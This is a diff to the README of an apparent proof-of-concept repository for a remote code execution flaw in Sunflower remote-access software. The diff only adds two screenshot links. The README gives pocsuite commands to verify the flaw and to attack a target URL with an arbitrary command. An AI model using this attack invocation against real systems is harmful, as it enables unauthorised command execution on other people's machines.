@@ -1,8 +1,10 @@
 # sunflower_RCE_POC（CNVD-2022-10270/CNVD-2022-03672）
 sunflower_RCE_POC
 POC:pocsuite -r sunflower_RCE_POC.py -u url --verify --thread 10
+![1645599856(1)](https://user-images.githubusercontent.com/54984589/155274394-b8e92e9e-d860-4578-9bf1-fd6ca2b2dd5e.png)
 
 EXP:pocsuite -r sunflower_RCE_POC.py -u url --attack --command [command]
+![1645600033(1)](https://user-images.githubusercontent.com/54984589/155274717-cc23aa93-7a56-4ecd-a8a6-10719647f37f.png)
 
 
 # 免责声明
